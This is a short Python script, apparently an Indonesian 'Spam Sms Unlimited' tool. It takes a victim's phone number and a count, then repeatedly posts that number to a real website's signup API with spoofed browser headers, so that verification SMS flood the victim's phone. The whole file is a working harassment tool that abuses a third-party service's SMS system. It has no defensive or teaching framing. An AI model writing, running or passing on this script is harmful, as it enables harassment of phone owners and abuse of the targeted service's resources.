import requests,json,os,time


os.system("clear")

k = 0
print("∆ AUTHOR : START8HILMI ∆")
print("∆ YT : START8HILMI ∆")
print("Spam Sms Unlimited ( Tak Terbatas )")
nomer = input("NOMOR : ")
jumlah = int(input("JUMLAH : "))
headers = {
"Host": "eci.id",
"Connection": "keep-alive",
"Content-Length": "27",
"Accept": "application/json, text/plain, */*",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"Content-Type": "application/json",
"Origin": "https://eci.id",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://eci.id/register",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
data = json.dumps({"identity":nomer})
for i in range(jumlah):
  k += 1
  pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text
  if "success" in pos:
    print("Spam Sms Berhasil Ke",k)
    time.sleep(60)
  else:
    print("Spam Sms Gagal Ke",k)
    time.sleep(60)
